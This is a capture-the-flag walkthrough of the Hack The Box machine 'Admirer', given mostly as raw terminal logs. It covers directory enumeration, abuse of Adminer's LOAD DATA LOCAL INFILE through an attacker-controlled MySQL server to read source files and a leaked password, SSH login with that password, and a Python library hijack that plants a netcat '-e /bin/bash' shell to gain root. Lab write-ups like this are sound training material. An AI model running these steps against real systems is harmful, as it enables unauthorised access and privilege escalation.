root@Blue3:.../WEB# webdirscan --url=http://admirer.htb/utility-scripts/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admirer.htb/utility-scripts/
[+] Threads:        30
[+] Wordlist:       /media/Linux-Storage/[Github]/eblue3/CTF/Wordlists/WEB/big
[+] Status codes:   200,204,301,302,307
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,config,cfg,cgi,html
[+] Timeout:        10s
===============================================================
2020/08/30 02:45:35 Starting gobuster
===============================================================
/admin_tasks.php (Status: 200)
/adminer.php (Status: 200)
/info.php (Status: 200)
/phptest.php (Status: 200)
===============================================================
2020/08/30 02:51:59 Finished
===============================================================

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

=> http://admirer.htb/utility-scripts/adminer.php
reading this helps me: https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool

root@Blue3:~# mysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12
Server version: 8.0.21-1 (Debian)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> CREATE DATABASE admirer;
Query OK, 1 row affected (0.01 sec)

mysql> INSERT INTO mysql.user (User,Host,authentication_string,ssl_cipher,x509_issuer,x509_subject) VALUES ('blue3','%','demopassword','','','');
Query OK, 1 row affected (0.01 sec)

mysql> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.01 sec)

mysql> use admirer;
Database changed

mysql> create user 'blue3'@'localhost' identified by 'iamAdmin@123';
Query OK, 0 rows affected (0.01 sec)

mysql> grant all privileges on *.* to 'blue3'@'localhost' with grant option;
Query OK, 0 rows affected (0.01 sec)

mysql> grant all privileges on *.* to 'blue3'@'%' with grant option;
Query OK, 0 rows affected (0.00 sec)

mysql> create table test(data VARCHAR(255));
Query OK, 0 rows affected (0.02 sec)

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

root@Blue3:~# nano /etc/mysql/mariadb.conf.d/50-server.cnf
=>
bind-address            = 0.0.0.0

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

http://admirer.htb/utility-scripts/adminer.php?server=10.10.16.3&username=demo&db=admirer
=> We are in
=> Doing SQL Command:
http://admirer.htb/utility-scripts/adminer.php?server=10.10.16.3&username=demo&db=admirer&sql=

load data local infile 'app/data/local.xml'
into table test
fields terminated by "/n"

Error in query (7890): Can't find file 'app/data/local.xml'.

=> Letâ€™s try for index.php
load data local infile '../index.php'
into table test
fields terminated by "/n"

Query executed OK, 123 rows affected. (0.463 s) Edit, Warnings

=> OK
http://admirer.htb/utility-scripts/adminer.php?server=10.10.16.3&username=blue3&db=admirer&select=test
=>
$servername = "localhost";
$username = "waldo";
$password = "&<h5b~yK3F#{PaPB&dA}{H>";
$dbname = "admirerdb";

=> SSH?
root@Blue3:~# ssh waldo@admirer.htb
waldo@admirer.htb's password: &<h5b~yK3F#{PaPB&dA}{H>
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ ls
user.txt
waldo@admirer:~$ cat user.txt
********************************

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh
#!/bin/bash
...

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

...

=> [ "$EUID" -eq 0 ]: "If you have EUID=0 you can run any binary as root. Just run bash, you'll see your UID=0."

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

waldo@admirer:/opt/scripts$ ls -ltra
total 16
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
waldo@admirer:/opt/scripts$ cat backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

waldo@admirer:/opt/scripts$ python -c 'import sys; print "\n".join(sys.path)'

/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

PYTHON PACKAGE HI-JACKING: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
"For example, if we have a script that imports the requests library,
 and the requests library is stored in /usr/local/lib/python2.7/dist-packages.
 If we create a new file named requests.py and place it in any of the six directories
 that appear in the list above prior to /usr/local/lib/python2.7/dist-packages,
 it would result in the successful hi-jacking of that library."

Points to Note:
    We know we can change PYTHONPATH
    admin_tasks.sh can be runned as root
    admin_tasks.sh is running backup.py
    So backup.py will also be running a root
    backup.py is importing shutil module
    Therefore if we change shutil.py to our custom shutil.py which contain our shell we can gain shell as root

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

waldo@admirer:/usr/lib/python2.7$ cd /tmp
waldo@admirer:/tmp$ nano shutil.py
import os
os.system("nc -lvp 3592 -e /bin/bash")

waldo@admirer:/tmp$ sudo --help
sudo - execute a command as another user
  -E, --preserve-env          preserve user environment when running command

=> Run the backup.py at PATH of current folder:
waldo@admirer:/tmp$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...
waldo@admirer:/tmp$ listening on [any] 3592 ...

=> OK

#
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ----------         NEXT          ---------- ---------- ---------- ----------
  ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ---------- ----------
#

waldo@admirer:/tmp$ listening on [any] 3592 ...
10.10.16.3: inverse host lookup failed: Host name lookup failure
connect to [10.10.10.187] from (UNKNOWN) [10.10.16.3] 58170

=>
root@Blue3:~# nc 10.10.10.187 3592

whoami
root
cat /root/root.txt
********************************
